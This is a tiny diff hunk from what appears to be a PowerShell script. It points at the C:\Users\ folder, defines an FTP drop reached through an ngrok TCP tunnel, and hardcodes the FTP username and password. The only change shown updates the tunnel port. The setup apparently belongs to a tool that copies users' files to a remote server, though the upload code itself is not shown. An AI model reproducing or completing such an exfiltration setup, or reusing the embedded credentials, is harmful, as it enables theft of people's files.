@@ -2,7 +2,7 @@
 $Dir="C:\Users\"    
  
 #ftp server 
-$ftp = "ftp://0.tcp.ngrok.io:18939//home/dumdumftp/" 
+$ftp = "ftp://0.tcp.ngrok.io:16260//home/dumdumftp/" 
 $user = "dumdumftp" 
 $pass = "p#}Vck,fayt?ipNqYhy9uzcG"  
  
